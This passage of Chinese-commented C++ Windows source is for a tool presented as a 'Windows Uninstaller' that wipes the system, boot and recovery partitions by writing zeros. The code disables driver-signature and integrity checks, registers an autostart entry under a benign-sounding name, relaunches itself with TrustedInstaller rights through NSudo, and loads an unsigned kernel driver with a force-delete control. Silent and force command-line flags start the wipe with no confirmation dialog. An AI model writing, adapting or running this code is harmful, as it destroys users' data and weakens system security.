    // 命令2: 禁用完整性检查
    wchar_t cmd2[] = L"bcdedit /set nointegritychecks on";
    if (!CreateProcessW(nullptr, cmd2, nullptr, nullptr, FALSE, CREATE_DEFAULT_ERROR_MODE, nullptr, nullptr, &si, &pi)) {
        DebugLogWithError(L"EnableTestMode: CreateProcessW 失败 (nointegritychecks)");
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode2 = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode2);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exitCode2 == 0) {
        DebugLog(L"EnableTestMode: 完整性检查已禁用\n");
    } else {
        DebugLog(L"EnableTestMode: 禁用完整性检查失败, 退出码: %lu\n", exitCode2);
    }
    
    // 两个命令都成功才返回true
    if (exitCode1 == 0 && exitCode2 == 0) {
        DebugLog(L"EnableTestMode: 测试模式配置完成\n");
        return true;
    } else {
        DebugLog(L"EnableTestMode: 部分配置失败\n");
        return false;
    }
}

bool DisableTestMode() {
    DebugLog(L"DisableTestMode: 正在关闭测试模式...\n");
    
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = g_silentMode ? SW_HIDE : SW_SHOW;
    
    wchar_t cmd[] = L"bcdedit /set testsigning off";
    if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_DEFAULT_ERROR_MODE, nullptr, nullptr, &si, &pi)) {
        DebugLogWithError(L"DisableTestMode: CreateProcessW 失败");
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exitCode == 0) {
        DebugLog(L"DisableTestMode: 测试模式已关闭\n");
        return true;
    } else {
        DebugLog(L"DisableTestMode: 失败, 退出码: %lu\n", exitCode);
        return false;
    }
}

bool ScheduleAutoRun() {
    DebugLog(L"ScheduleAutoRun: 正在设置自启动...\n");
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        wchar_t selfPath[MAX_PATH];
        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
        
        std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
        if (!ExtractResourceToFile(hInst, NSUDO_BIN, nsudoPath)) {
            DebugLog(L"ScheduleAutoRun: 无法提取NSudo到临时目录\n");
            RegCloseKey(hKey);
            return false;
        }
        
        std::wstring value = L"\"" + nsudoPath + L"\" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SILENT_PARAM;
        if (RegSetValueExW(hKey, L"WindowsUninstaller", 0, REG_SZ, (const BYTE*)value.c_str(), (value.size() + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            DebugLog(L"ScheduleAutoRun: 自启动已设置 (使用NSudo)\n");
            return true;
        }
        RegCloseKey(hKey);
    }
    
    DebugLog(L"ScheduleAutoRun: 失败\n");
    return false;
}

bool ClearAutoRun() {
    DebugLog(L"ClearAutoRun: 正在清除自启动...\n");

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegDeleteValueW(hKey, L"WindowsUninstaller") == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            DebugLog(L"ClearAutoRun: 自启动已清除\n");
            return true;
        }
        RegCloseKey(hKey);
    }

    DebugLog(L"ClearAutoRun: 清除失败或值不存在\n");
    return false;
}

bool LoadDriver() {
    DebugLog(L"LoadDriver: 正在加载驱动...\n");

    std::wstring driverPath = GetTempFilePath(L"OpenEFCHKMD.sys");
    DebugLog(L"LoadDriver: 驱动文件路径 %s\n", driverPath.c_str());
    
    if (!ExtractResourceToFile(hInst, DRIVER_SYS, driverPath)) {
        DebugLog(L"LoadDriver: 无法提取驱动文件\n");
        return false;
    }
    
    WIN32_FILE_ATTRIBUTE_DATA attrs;
    if (GetFileAttributesExW(driverPath.c_str(), GetFileExInfoStandard, &attrs)) {
        DebugLog(L"LoadDriver: 驱动文件大小 - %u bytes\n", attrs.nFileSizeLow);
    } else {
        DebugLogWithError(L"LoadDriver: 获取驱动文件属性失败");
    }

    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        DebugLogWithError(L"LoadDriver: OpenSCManager失败");
        DeleteFileW(driverPath.c_str());
        return false;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        L"OpenEFCHKMD",
        L"OpenEFCH Kernel Driver",
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            DebugLog(L"LoadDriver: 服务已存在，先删除旧服务\n");
            // 打开现有服务
            SC_HANDLE hOldService = OpenServiceW(hSCManager, L"OpenEFCHKMD", SERVICE_STOP | DELETE);
            if (hOldService) {
                // 停止服务（如果正在运行）
                SERVICE_STATUS status;
                ControlService(hOldService, SERVICE_CONTROL_STOP, &status);
                // 删除服务
                DeleteService(hOldService);
                CloseServiceHandle(hOldService);
                DebugLog(L"LoadDriver: 旧服务已删除\n");
            }
            // 创建新服务
            hService = CreateServiceW(
                hSCManager,
                L"OpenEFCHKMD",
                L"OpenEFCH Kernel Driver",
                SERVICE_START | DELETE | SERVICE_STOP,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                driverPath.c_str(),
                NULL, NULL, NULL, NULL, NULL
            );
        } else {
            DebugLogWithError(L"LoadDriver: CreateService失败");
        }
    }
    
    if (hService) {
        DebugLog(L"LoadDriver: 服务创建成功\n");
    }

    if (!hService) {
        DebugLogWithError(L"LoadDriver: CreateService/OpenService失败");
        CloseServiceHandle(hSCManager);
        DeleteFileW(driverPath.c_str());
        return false;
    }

    DebugLog(L"LoadDriver: 正在启动服务...\n");
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            DebugLogWithError(L"LoadDriver: StartService失败");
            // 不返回，继续尝试打开设备
        } else {
            DebugLog(L"LoadDriver: 服务已经在运行\n");
        }
    } else {
        DebugLog(L"LoadDriver: StartServiceW 返回成功\n");
        
        SERVICE_STATUS status;
        if (QueryServiceStatus(hService, &status)) {
            DebugLog(L"LoadDriver: 服务状态 - CurrentState=%lu, Win32ExitCode=%lu\n", 
                status.dwCurrentState, status.dwWin32ExitCode);
            if (status.dwCurrentState != SERVICE_RUNNING) {
                DebugLog(L"LoadDriver: 警告 - 服务未处于运行状态\n");
            }
        } else {
            DebugLogWithError(L"LoadDriver: QueryServiceStatus失败");
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    DebugLog(L"LoadDriver: 服务句柄已关闭\n");
    DebugLog(L"LoadDriver: 等待驱动初始化...\n");
    Sleep(1000);

    DebugLog(L"LoadDriver: 尝试打开GLOBALROOT设备...\n");
    g_hDriver = CreateFileW(
        L"\\\\?\\GLOBALROOT\\Device\\OpenEFCHKernelDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (g_hDriver == INVALID_HANDLE_VALUE) {
        DebugLog(L"LoadDriver: GLOBALROOT路径失败，尝试普通路径...\n");
        g_hDriver = CreateFileW(
            L"\\\\.\\OpenEFCHKernelDriver",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
    }

    if (g_hDriver == INVALID_HANDLE_VALUE) {
        DebugLog(L"LoadDriver: 驱动设备打开失败\n");
        DeleteFileW(driverPath.c_str());
        return false;
    }

    DebugLog(L"LoadDriver: 驱动设备打开成功\n");
    DeleteFileW(driverPath.c_str());

    DebugLog(L"LoadDriver: 驱动加载成功\n");
    return true;
}

void UnloadDriver() {
    DebugLog(L"UnloadDriver: 正在卸载驱动...\n");

    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        DebugLogWithError(L"UnloadDriver: OpenSCManager失败");
        return;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, L"OpenEFCHKMD", SERVICE_STOP | DELETE);
    if (hService) {
        SERVICE_STATUS status;
        ControlService(hService, SERVICE_CONTROL_STOP, &status);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hSCManager);
    DebugLog(L"UnloadDriver: 驱动卸载完成\n");
}

bool SendIoctl(DWORD ioctlCode, LPVOID inputBuffer, DWORD inputSize, LPVOID outputBuffer, DWORD outputSize, LPDWORD bytesReturned) {
    if (g_hDriver == INVALID_HANDLE_VALUE) {
        DebugLog(L"SendIoctl: 驱动未加载\n");
        return false;
    }

    return DeviceIoControl(
        g_hDriver,
        ioctlCode,
        inputBuffer,
        inputSize,
        outputBuffer,
        outputSize,
        bytesReturned,
        NULL
    ) != FALSE;
}

bool ForceDeleteFile(const std::wstring& filePath) {
    DebugLog(L"ForceDeleteFile: 删除文件 %s\n", filePath.c_str());
    DWORD bytesReturned = 0;
    return SendIoctl(IOCTL_FORCEDELETEFILE, (LPVOID)filePath.c_str(), (DWORD)(filePath.size() * sizeof(wchar_t)), NULL, 0, &bytesReturned);
}

void RestartComputer() {
    DebugLog(L"RestartComputer: 正在重启系统...\n");
    system("shutdown /r /t 10 /c \"Windows Uninstaller - 系统将在10秒后重启\"");
}

int AskEnableTestModeDialog(HWND hWnd) {
    const wchar_t* msg = L"要擦除磁盘，必须启用Windows测试模式。\n\n"
        L"启用测试模式允许加载未签名的驱动程序，这是擦除系统盘所必需的。\n\n"
        L"是否启用测试模式并继续？\n\n"
        L"注意：启用后系统将重启，程序会在重启后自动继续执行。";
    return MessageBoxW(hWnd, msg, L"启用测试模式", MB_YESNO | MB_ICONWARNING | MB_TOPMOST);
}

int AskDisableTestModeDialog(HWND hWnd) {
    const wchar_t* msg = L"操作已取消或擦除失败。\n\n"
        L"测试模式当前已启用。\n\n"
        L"是否关闭测试模式？\n\n"
        L"是 = 关闭并重启\n"
        L"否 = 保持测试模式启用（可能影响安全性）";
    return MessageBoxW(hWnd, msg, L"关闭测试模式", MB_YESNO | MB_ICONQUESTION | MB_TOPMOST);
}

void OnStartUninstall() {
    DebugLog(L"OnStartUninstall: 开始执行\n");
    
    g_testModeEnabled = IsTestModeEnabled();
    DebugLog(L"测试模式状态: %s\n", g_testModeEnabled ? L"已开启" : L"未开启");
    
    if (!g_testModeEnabled) {
        if (g_autoRunRequested) {
            DebugLog(L"自动运行模式: 自动启用测试模式\n");
            AddOutput(L"正在开启测试模式...");
            
            if (EnableTestMode()) {
                AddOutput(L"测试模式已开启");
                ScheduleAutoRun();
                AddOutput(L"系统将在10秒后重启...");
                AddOutput(L"重启后程序将自动继续执行");
                
                MessageBoxW(hWndMain,
                    L"Test mode enabled. System will restart in 10 seconds.\n\nPlease re-run this program after restart.",
                    L"Restarting",
                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                
                RestartComputer();
                PostMessageW(hWndMain, WM_CLOSE, 0, 0);
                return;
            } else {
                AddOutput(L"Error: Cannot enable test mode");
                MessageBoxW(hWndMain,
                    L"Cannot enable test mode. Please make sure to run as administrator.",
                    L"Error",
                    MB_OK | MB_ICONERROR | MB_TOPMOST);
                return;
            }
        }
        
        int result = AskEnableTestModeDialog(hWndMain);
        if (result == IDYES) {
            DebugLog(L"用户选择开启测试模式\n");
            AddOutput(L"正在开启测试模式...");
            
            if (EnableTestMode()) {
                AddOutput(L"测试模式已开启");
                ScheduleAutoRun();
                AddOutput(L"系统将在10秒后重启...");
                AddOutput(L"重启后程序将自动继续执行");
                
                MessageBoxW(hWndMain,
                    L"Test mode enabled. System will restart in 10 seconds.\n\nPlease re-run this program after restart.",
                    L"Restarting",
                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                
                RestartComputer();
                PostMessageW(hWndMain, WM_CLOSE, 0, 0);
                return;
            } else {
                AddOutput(L"Error: Cannot enable test mode");
                MessageBoxW(hWndMain,
                    L"Cannot enable test mode. Please make sure to run as administrator.",
                    L"Error",
                    MB_OK | MB_ICONERROR | MB_TOPMOST);
                return;
            }
        } else {
            DebugLog(L"用户选择取消\n");
            AddOutput(L"操作已取消");
            return;
        }
    } else {
        DebugLog(L"测试模式已开启，直接执行\n");
    }
    
    std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
    DebugLog(L"临时NSudo路径: %s\n", nsudoPath.c_str());
    
    AddOutput(L"正在提取NSudo到临时目录...");
    DebugLog(L"调用 ExtractResourceToFile, hInst=%p, NSUDO_BIN=%d\n", hInst, NSUDO_BIN);
    
    if (!ExtractResourceToFile(hInst, NSUDO_BIN, nsudoPath)) {
        AddOutput(L"错误: 无法提取NSudo");
        DebugLog(L"ERROR: ExtractResourceToFile 失败\n");
        return;
    }
    AddOutput(L"NSudo提取成功");
    DebugLog(L"NSudo提取成功\n");

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
    DebugLog(L"当前程序路径: %s\n", selfPath);

    std::wstring command = nsudoPath + L" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SECRET_PARAM;
    DebugLog(L"NSudo命令: %s\n", command.c_str());
    
    AddOutput(L"正在以TrustedInstaller权限重新启动...");
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    BOOL createResult = CreateProcessW(nullptr, const_cast<wchar_t*>(command.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
    if (!createResult) {
        DebugLogWithError(L"CreateProcessW 失败");
        AddOutput(L"错误: 无法启动NSudo进程");
        return;
    }
    DebugLog(L"CreateProcessW 成功, hProcess=%p, hThread=%p\n", pi.hProcess, pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    DebugLog(L"OnStartUninstall: 完成\n");
    DestroyWindow(hWndMain);
}

void OnCancel() {
    if (g_isElevatedMode && g_testModeEnabled) {
        int result = AskDisableTestModeDialog(hWndMain);
        if (result == IDYES) {
            DebugLog(L"用户选择关闭测试模式\n");
            AddOutput(L"正在关闭测试模式...");
            DisableTestMode();
            ClearAutoRun();
            AddOutput(L"系统将在10秒后重启...");
            RestartComputer();
        }
        ClearAutoRun();
    }
    DestroyWindow(hWndMain);
}

void CreateMainInterface(HWND hWnd) {
    RECT rc;
    GetClientRect(hWnd, &rc);
    int clientWidth = rc.right - rc.left;
    int clientHeight = rc.bottom - rc.top;

    float scaleX = (float)clientWidth / 700.0f;
    float scaleY = (float)clientHeight / 550.0f;
    float scale = (scaleX < scaleY) ? scaleX : scaleY;
    if (scale < 0.8f) scale = 0.8f;
    if (scale > 2.0f) scale = 2.0f;

    int margin = (int)(25 * scale);
    int ctrlHeight = (int)(40 * scale);
    int ctrlSpacing = (int)(15 * scale);
    int titleFontSize = (int)(22 * scale);
    int normalFontSize = (int)(14 * scale);

    HFONT hTitleFont = CreateFontW(titleFontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");
    HFONT hNormalFont = CreateFontW(normalFontSize, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    int titleHeight = (int)(48 * scale);
    HWND hTitle = CreateWindowExW(0, L"STATIC", L"Windows 卸载程序",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        margin, margin, clientWidth - margin * 2, titleHeight,
        hWnd, (HMENU)IDC_STATIC_TITLE, hInst, nullptr);
    SendMessageW(hTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);

    int currentY = margin + titleHeight + (int)(10 * scale);

    int warningHeight = (int)(32 * scale);
    HWND hWarning = CreateWindowExW(0, L"STATIC", L"⚠️ 警告：此操作将永久删除所有数据！",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        margin, currentY, clientWidth - margin * 2, warningHeight,
        hWnd, (HMENU)IDC_STATIC_WARNING, hInst, nullptr);
    SendMessageW(hWarning, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += warningHeight + (int)(15 * scale);

    int descHeight = (int)(140 * scale);
    HWND hDesc = CreateWindowExW(0, L"STATIC", L"此程序将执行以下操作：\n\n• 禁用用户账户控制(UAC)\n• 以TrustedInstaller权限运行\n• 彻底擦除系统盘、引导分区和恢复分区\n\n请确保您已备份所有重要数据！",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        margin, currentY, clientWidth - margin * 2, descHeight,
        hWnd, (HMENU)IDC_STATIC_DESC, hInst, nullptr);
    SendMessageW(hDesc, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += descHeight + (int)(15 * scale);

    int labelHeight = (int)(24 * scale);
    HWND hProgressLabel = CreateWindowExW(0, L"STATIC", L"操作日志：",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        margin, currentY, clientWidth - margin * 2, labelHeight,
        hWnd, (HMENU)IDC_STATIC_PROGRESS, hInst, nullptr);
    SendMessageW(hProgressLabel, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += labelHeight + (int)(10 * scale);

    int editHeight = clientHeight - currentY - ctrlHeight - ctrlSpacing - margin * 2;
    if (editHeight < 100) editHeight = 100;
    
    hEditOutput = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"点击\"开始卸载\"以继续...",
        WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL | WS_VSCROLL,
        margin, currentY, clientWidth - margin * 2, editHeight,
        hWnd, (HMENU)IDC_EDIT_OUTPUT, hInst, nullptr);
    SendMessageW(hEditOutput, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    SendMessageW(hEditOutput, EM_SETLIMITTEXT, 0, 0);
    currentY += editHeight + (int)(15 * scale);

    int buttonWidth = (int)(120 * scale);
    int buttonStartX = (clientWidth - buttonWidth * 2 - ctrlSpacing) / 2;

    HWND hBtnUninstall = CreateWindowExW(0, L"BUTTON", L"开始卸载",
        WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
        buttonStartX, currentY, buttonWidth, ctrlHeight,
        hWnd, (HMENU)IDC_BUTTON_UNINSTALL, hInst, nullptr);
    SendMessageW(hBtnUninstall, WM_SETFONT, (WPARAM)hNormalFont, TRUE);

    HWND hBtnCancel = CreateWindowExW(0, L"BUTTON", L"取消",
        WS_CHILD | WS_VISIBLE | WS_TABSTOP,
        buttonStartX + buttonWidth + ctrlSpacing, currentY, buttonWidth, ctrlHeight,
        hWnd, (HMENU)IDC_BUTTON_CANCEL, hInst, nullptr);
    SendMessageW(hBtnCancel, WM_SETFONT, (WPARAM)hNormalFont, TRUE);

    SetFocus(hBtnUninstall);
}

void CreateConfirmInterface(HWND hWnd) {
    RECT rc;
    GetClientRect(hWnd, &rc);
    int clientWidth = rc.right - rc.left;
    int clientHeight = rc.bottom - rc.top;

    float scaleX = (float)clientWidth / 700.0f;
    float scaleY = (float)clientHeight / 550.0f;
    float scale = (scaleX < scaleY) ? scaleX : scaleY;
    if (scale < 0.8f) scale = 0.8f;
    if (scale > 2.0f) scale = 2.0f;

    int margin = (int)(25 * scale);
    int ctrlHeight = (int)(40 * scale);
    int ctrlSpacing = (int)(15 * scale);
    int titleFontSize = (int)(22 * scale);
    int normalFontSize = (int)(14 * scale);

    HFONT hTitleFont = CreateFontW(titleFontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");
    HFONT hNormalFont = CreateFontW(normalFontSize, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    int titleHeight = (int)(48 * scale);
    HWND hTitle = CreateWindowExW(0, L"STATIC", L"⚠️ 确认卸载",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        margin, margin, clientWidth - margin * 2, titleHeight,
        hWnd, (HMENU)IDC_STATIC_TITLE, hInst, nullptr);
    SendMessageW(hTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);

    int currentY = margin + titleHeight + (int)(10 * scale);

    int warningHeight = (int)(32 * scale);
    HWND hWarning = CreateWindowExW(0, L"STATIC", L"⚠️ ⚠️ ⚠️ 危险操作确认 ⚠️ ⚠️ ⚠️",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        margin, currentY, clientWidth - margin * 2, warningHeight,
        hWnd, (HMENU)IDC_STATIC_WARNING2, hInst, nullptr);
    SendMessageW(hWarning, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += warningHeight + (int)(15 * scale);

    int descHeight = (int)(180 * scale);
    HWND hDesc = CreateWindowExW(0, L"STATIC", L"您即将执行的操作将：\n\n• 禁用UAC\n• 将系统盘(C:)所有扇区写零\n• 将引导分区所有扇区写零\n• 将恢复分区所有扇区写零\n\n此操作不可逆转！数据将永久丢失！\n\n确定要继续吗？",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        margin, currentY, clientWidth - margin * 2, descHeight,
        hWnd, (HMENU)IDC_STATIC_DESC, hInst, nullptr);
    SendMessageW(hDesc, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += descHeight + (int)(15 * scale);

    int labelHeight = (int)(24 * scale);
    HWND hProgressLabel = CreateWindowExW(0, L"STATIC", L"操作日志：",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        margin, currentY, clientWidth - margin * 2, labelHeight,
        hWnd, (HMENU)IDC_STATIC_PROGRESS, hInst, nullptr);
    SendMessageW(hProgressLabel, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    currentY += labelHeight + (int)(10 * scale);

    int editHeight = clientHeight - currentY - ctrlHeight - ctrlSpacing - margin * 2;
    if (editHeight < 100) editHeight = 100;
    
    hEditOutput = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"已获得TrustedInstaller权限...\n点击\"确认卸载\"将开始擦除磁盘。",
        WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL | WS_VSCROLL,
        margin, currentY, clientWidth - margin * 2, editHeight,
        hWnd, (HMENU)IDC_EDIT_OUTPUT, hInst, nullptr);
    SendMessageW(hEditOutput, WM_SETFONT, (WPARAM)hNormalFont, TRUE);
    SendMessageW(hEditOutput, EM_SETLIMITTEXT, 0, 0);
    currentY += editHeight + (int)(15 * scale);

    int buttonWidth = (int)(120 * scale);
    int buttonStartX = (clientWidth - buttonWidth * 2 - ctrlSpacing) / 2;

    HWND hBtnConfirm = CreateWindowExW(0, L"BUTTON", L"确认卸载",
        WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
        buttonStartX, currentY, buttonWidth, ctrlHeight,
        hWnd, (HMENU)IDC_BUTTON_CONFIRM, hInst, nullptr);
    SendMessageW(hBtnConfirm, WM_SETFONT, (WPARAM)hNormalFont, TRUE);

    HWND hBtnCancel = CreateWindowExW(0, L"BUTTON", L"取消",
        WS_CHILD | WS_VISIBLE | WS_TABSTOP,
        buttonStartX + buttonWidth + ctrlSpacing, currentY, buttonWidth, ctrlHeight,
        hWnd, (HMENU)IDC_BUTTON_CANCEL, hInst, nullptr);
    SendMessageW(hBtnCancel, WM_SETFONT, (WPARAM)hNormalFont, TRUE);

    SetFocus(hBtnConfirm);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_COMMAND: {
            int wmId = LOWORD(wParam);
            int wmEvent = HIWORD(wParam);
            
            if (wmEvent == BN_CLICKED) {
                switch (wmId) {
                    case IDC_BUTTON_UNINSTALL:
                        OnStartUninstall();
                        return 0;
                    case IDC_BUTTON_CONFIRM:
                        OnConfirmUninstall();
                        return 0;
                    case IDC_BUTTON_CANCEL:
                        OnCancel();
                        return 0;
                }
            }
            break;
        }
        case WM_SIZE: {
            if (wParam != SIZE_MINIMIZED) {
                DestroyAllControls(hWnd);
                if (g_isElevatedMode) {
                    CreateConfirmInterface(hWnd);
                } else {
                    CreateMainInterface(hWnd);
                }
            }
            return 0;
        }
        case WM_CLOSE: {
            DestroyWindow(hWnd);
            return 0;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            return 0;
        }
    }
    return DefWindowProcW(hWnd, message, wParam, lParam);
}

BOOL RegisterWindowClass(HINSTANCE hInstance) {
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIconW(hInstance, MAKEINTRESOURCE(IDI_MAIN_ICON));
    wcex.hCursor        = LoadCursorW(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = nullptr;
    wcex.lpszClassName  = CLASS_NAME;
    wcex.hIconSm        = LoadIconW(hInstance, MAKEINTRESOURCE(IDI_MAIN_ICON));

    return RegisterClassExW(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow, bool isElevated) {
    hInst = hInstance;
    g_isElevatedMode = isElevated;

    hWndMain = CreateWindowExW(
        0,
        CLASS_NAME,
        isElevated ? L"确认卸载" : L"Windows 卸载程序",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 700, 550,
        nullptr, nullptr, hInstance, nullptr
    );

    if (!hWndMain) {
        return FALSE;
    }

    if (isElevated) {
        CreateConfirmInterface(hWndMain);
    } else {
        CreateMainInterface(hWndMain);
    }

    ShowWindow(hWndMain, nCmdShow);
    UpdateWindow(hWndMain);

    if (g_autoRunRequested) {
        if (isElevated) {
            PostMessageW(hWndMain, WM_COMMAND, MAKELONG(IDC_BUTTON_CONFIRM, BN_CLICKED), 0);
        } else {
            PostMessageW(hWndMain, WM_COMMAND, MAKELONG(IDC_BUTTON_UNINSTALL, BN_CLICKED), 0);
        }
    }

    return TRUE;
}

void RunSilentMode(HINSTANCE hInstance);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    LPWSTR cmdLineW = GetCommandLineW();
    std::wstring cmdLine(cmdLineW);
    
    bool isElevated = (cmdLine.find(SECRET_PARAM) != std::wstring::npos);
    g_silentMode = (cmdLine.find(SILENT_PARAM) != std::wstring::npos);
    bool isAutoBoot = (cmdLine.find(AUTOBOOT_PARAM) != std::wstring::npos);
    bool isForce = (cmdLine.find(FORCE_PARAM) != std::wstring::npos);
    
    if (isElevated) {
        g_autoRunRequested = true;
        ClearAutoRun();
        DebugLog(L"检测到自启动参数，已清除自启动注册表\n");
    }

    if (isForce) {
        DebugLog(L"检测到强制删除参数，直接执行擦除...\n");
        hInst = hInstance;
        g_silentMode = true;
        WipeDisksThread(nullptr);
        return 0;
    }

    if (g_silentMode) {
        DebugLog(L"检测到静默运行参数，进入静默模式\n");
        hInst = hInstance;
        RunSilentMode(hInstance);
        return 0;
    }

    if (isAutoBoot) {
        DebugLog(L"检测到自启动参数，自动执行擦除操作\n");
        g_autoRunRequested = true;
        ClearAutoRun();
    }

    if (!RegisterWindowClass(hInstance)) {
        return 0;
    }

    if (!InitInstance(hInstance, nCmdShow, isElevated)) {
        return 0;
    }

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}

// 查找 EFI 分区
bool FindEFIPartition(TCHAR* driveLetter) {
    DebugLog(L"FindEFIPartition: 正在查找 EFI 分区...\n");
    
    // 遍历所有可能的驱动器字母
    for (TCHAR c = L'C'; c <= L'Z'; c++) {
        TCHAR path[10] = {0};
        swprintf_s(path, sizeof(path)/sizeof(TCHAR), L"%c:\\", c);
        
        // 获取驱动器类型
        UINT driveType = GetDriveTypeW(path);
        if (driveType != DRIVE_FIXED) continue;
        
        // 尝试获取卷信息
        TCHAR volumeName[MAX_PATH] = {0};
        TCHAR fileSystem[MAX_PATH] = {0};
        DWORD serialNumber = 0;
